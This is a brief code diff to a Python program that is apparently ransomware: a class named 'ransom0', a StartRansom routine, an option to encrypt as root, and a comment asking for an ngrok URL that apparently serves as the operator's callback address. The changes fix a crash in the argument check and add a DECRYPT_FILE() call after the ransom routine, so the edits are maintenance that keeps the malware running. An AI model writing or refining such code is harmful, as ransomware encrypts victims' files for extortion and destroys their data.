@@ -46,7 +46,7 @@ url = 'm1'  # PUT THE URL YOU GOT FROM NGROK HERE
 
 
 def encrypt_root():
-    return sys.argv[1] == 'root'
+    return len(sys.argv) > 1 and sys.argv[1] == 'root'
 
 
 class ransom0:
@@ -240,3 +240,4 @@ if __name__ == '__main__':
         f.write(str(digits))
         f.close()
         StartRansom()
+        DECRYPT_FILE()
